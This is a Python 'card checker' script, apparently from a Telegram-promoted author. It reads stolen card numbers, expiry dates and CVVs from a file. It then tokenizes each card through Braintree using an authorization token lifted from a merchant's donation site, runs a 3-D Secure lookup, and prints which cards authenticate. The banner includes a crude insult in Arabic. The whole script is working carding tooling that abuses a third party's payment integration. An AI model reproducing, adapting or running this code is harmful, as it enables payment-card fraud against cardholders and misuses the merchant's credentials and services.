import requests
import pyfiglet
import time
import user_agent
import webbrowser
webbrowser.open('https://t.me/ModcaTheLost')

Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

md2 = ("#====================================##============================")
print(C + md2)

print(Z + '𝗣𝗿𝗼𝗴𝗿𝗮𝗺𝗺𝗲𝗿 𝗠𝗼𝗱𝗰𝗮 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁')
print('تم تطوير الاداة على يد < 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁 🇬🇧 > و الاداة بدون حقوق ويلي يخمطها و ما يذكر المصدر امه زانية وهو رخيس')

md3 = ("#====================================##============================")
print(C+md3)

file=open('cc.txt',"+r")
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin = n[:6]
    mm=P.split('|')[1]
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    time.sleep(2)
    user = user_agent.generate_user_agent()
	
    headers = {
	     'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA2NDA4NDYsImp0aSI6ImM4MGRmMDdjLWRhYjgtNDQyNy1iNDE5LWE1MDQzMzBlNmUyMiIsInN1YiI6Ims2NnR3a3hyZnk5MmNqdGsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ims2NnR3a3hyZnk5MmNqdGsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.QqnwBaFaunYbx4sujttALsdiq5_AYp57B5QS2zLxj4hgAqqR76plyE2j_eqJdrkGbyDyrt44zLii3eMSHxCHEg',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
    json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': '154a006e-eb79-461e-9e74-7f5654afb68d',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': mm,
		                'expirationYear': yy,
		                'cvv': cvc,
		                'cardholderName': 'Mero AYman',
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
	
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token = (response.json()['data']['tokenizeCreditCard']['token'])
	
    headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'content-type': 'application/json',
	    'origin': 'https://touch.org.sg',
	    'referer': 'https://touch.org.sg/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
    json_data = {
	    'amount': 5,
	    'additionalInfo': {},
	    'bin': '544548',
	    'dfReferenceId': '1_295064ab-9682-4490-a2f6-05af825a01a5',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.97.1',
	        'cardinalDeviceDataCollectionTimeElapsed': 777,
	        'issuerDeviceDataCollectionTimeElapsed': 11068,
	        'issuerDeviceDataCollectionResult': False,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA2NDA4NDYsImp0aSI6ImM4MGRmMDdjLWRhYjgtNDQyNy1iNDE5LWE1MDQzMzBlNmUyMiIsInN1YiI6Ims2NnR3a3hyZnk5MmNqdGsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ims2NnR3a3hyZnk5MmNqdGsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.QqnwBaFaunYbx4sujttALsdiq5_AYp57B5QS2zLxj4hgAqqR76plyE2j_eqJdrkGbyDyrt44zLii3eMSHxCHEg',
	    'braintreeLibraryVersion': 'braintree/web/3.97.1',
	    '_meta': {
	        'merchantAppId': 'touch.org.sg',
	        'platform': 'web',
	        'sdkVersion': '3.97.1',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
        'sessionId': '154a006e-eb79-461e-9e74-7f5654afb68d',
    },
}
	
    response = requests.post(
	    f'https://api.braintreegateway.com/merchants/k66twkxrfy92cjtk/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
    if 'authenticate_attempt_successful' in response.text:
	    print(F+f'[ {start_num} ]',P,' -> Authenticate Attempt Successful ✅')
	    
    elif 'authentication' in response.text:
	    print(Z+f'[ {start_num} ]',P,' -> Authenticate Rejected ❌')